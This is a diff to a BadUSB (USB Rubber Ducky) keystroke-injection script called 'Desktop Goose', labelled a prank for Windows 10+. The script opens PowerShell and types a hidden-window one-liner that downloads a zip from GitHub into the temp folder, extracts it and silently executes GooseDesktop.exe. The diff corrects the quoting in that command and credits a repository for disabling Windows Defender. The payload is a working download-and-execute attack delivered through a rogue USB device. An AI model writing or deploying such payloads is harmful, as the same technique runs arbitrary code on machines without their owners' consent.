@@ -1,7 +1,7 @@
 REM Title: Desktop Goose
 REM Author: FalsePhilosopher
 REM Target:  Windows 10+
-REM Props: Hak5, https://samperson.itch.io/desktop-goose for the honks, 3ctOs for the PS bits I used https://github.com/3ct0s/badusb-download-execute-disable-windows-defender and memes
+REM Props: Hak5, https://samperson.itch.io/desktop-goose for the honks,jakoby for some PS bits I used, 3ctOs for the PS bits I used https://github.com/3ct0s/badusb-download-execute-disable-windows-defender and memes
 REM Version: 1.0
 REM Category: Prank
 REM Downloads and lets loose THE GOOSE!
@@ -12,5 +12,5 @@ GUI r
 DELAY 500
 STRING powershell
 DELAY 2000
-STRING powershell -w h $Z="$env:TMP"+'\dg.zip';$D="$env:TMP"+'\dg';curl https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Win/Desktop_Goose/dg.zip -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;$file = '$env:TMP"+'\dg\GooseDesktop.exe';$exec = New-Object -com shell.application;$exec.shellexecute($file);exit
+STRING powershell -w h ($Z="$env:TMP"+'\dg.zip');$D="$env:TMP"+'\dg';curl https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Win/Desktop_Goose/dg.zip -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;$file="$env:TMP"+'\dg\GooseDesktop.exe';$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 ENTER
